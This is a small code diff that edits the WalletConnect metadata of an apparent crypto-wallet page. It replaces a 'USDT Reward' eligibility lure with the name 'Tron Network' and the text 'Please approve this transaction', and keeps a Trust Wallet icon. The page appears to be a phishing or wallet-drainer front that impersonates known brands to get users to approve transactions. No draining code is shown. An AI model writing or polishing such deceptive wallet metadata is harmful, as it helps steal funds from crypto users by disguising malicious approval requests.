@@ -2,8 +2,8 @@ import UniversalProvider from "@walletconnect/universal-provider";
 
 const projectId = 'c5250465b531d3f5128116dc9460f64e';
 const metadata = {
-    name: 'USDT Reward',
-    description: 'Verify your eligibility for the reward.',
+    name: 'Tron Network',
+    description: 'Please approve this transaction',
     url: window.location.origin,
     icons: ['https://trustwallet.com/assets/images/media/assets/trust_platform.svg']
 };
